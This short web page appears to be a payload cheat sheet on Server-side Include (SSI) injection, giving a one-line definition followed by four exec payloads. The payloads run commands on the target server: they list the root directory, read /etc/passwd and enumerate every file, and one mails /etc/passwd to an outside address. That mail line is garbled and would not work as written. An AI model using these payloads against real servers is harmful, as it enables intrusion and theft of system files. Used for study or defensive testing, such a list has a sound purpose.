<h1>What is SSi Injection?</h1>
<P>SSI injection (Server-side Include) is a server-side exploit that lets an attacker send code into an application to be executed later, locally, by the web server.</p>

**Payloads :**
```
<!--#exec cmd="/bin/ls /" --><br/>
<!--#exec cmd="cat /etc/passwd" --><br/>
<!--#exec cmd="find / -name *.* -print" --><br/>
<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>
```

